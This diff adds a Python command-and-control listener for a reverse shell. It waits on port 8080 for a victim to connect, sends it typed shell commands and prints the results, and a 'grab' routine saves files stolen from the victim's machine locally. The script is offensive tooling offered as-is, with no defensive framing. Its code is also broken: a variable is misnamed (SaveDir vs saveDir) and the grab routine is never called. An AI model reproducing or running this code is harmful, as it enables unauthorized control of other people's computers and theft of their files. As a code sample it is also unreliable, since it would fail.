@@ -1,0 +1,59 @@
+import os
+import sys
+import socket
+from time import time
+import ctypes
+
+def connecting():
+    s = socket.socket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(("10.0.0.240", 8080))
+    s.listen(1)
+    print("="*60)
+    print(" TCP TUNING THE CONNECTION ATTEMPTS")
+    print("="*60)
+    print('[+] Listening for income TCP connection on port 8080')
+    conn, addr = s.accept()
+    print('[+]We got a connection from', addr)
+
+    while True:
+        print("="*60)
+        command = input("Shell> ")
+        if 'terminate' in command:
+            conn.send('terminate'.encode())
+            break
+        else:
+            conn.send(command.encode())
+            print(conn.recv(5000).decode())
+
+def goGrab(conn, command, operation):
+    conn.send(command.encode())
+    #For grab operation, open a file in write mode, inside GrabbedFiles folder
+    #File name should be of format: grabbed_sourceFilePathOfClientMachine
+    #File name example: grabbed_C:/Users/'name'/Desktop/audit.docx
+    if (operation == "grab"):
+        grab, sourcePath = command.split("*")
+        #Extract only the file name from the provided path
+        fileName = os.path.basename(sourcePath)
+        #Define save directory
+        SaveDir = os.path.join(os.getcwd(), "Desktop", "GrabbedFiles")
+        #Ensure directory exists
+        os.makedirs(saveDir, exist_ok=True)
+        #create full save path
+        savePath = os.path.join(saveDir, f"grabbed_{fileName}")
+        #Open the file and receive data
+        with open(savePath, 'wb') as f:
+            while True:
+                bits = conn.recv(5000)
+                if bits.endswith(b'DONE'):
+                    f.write(bits[:-4]) #Remove 'DONE' from last packet
+                    print('[+] Transfer Completed')
+                    break
+                if b'File not found' in bits:
+                    print('[-] Unable to find the file')
+                    break
+                f.write(bits)
+            print(f"[+] File saved as: {savePath}")
+def main():
+    connecting()
+main()
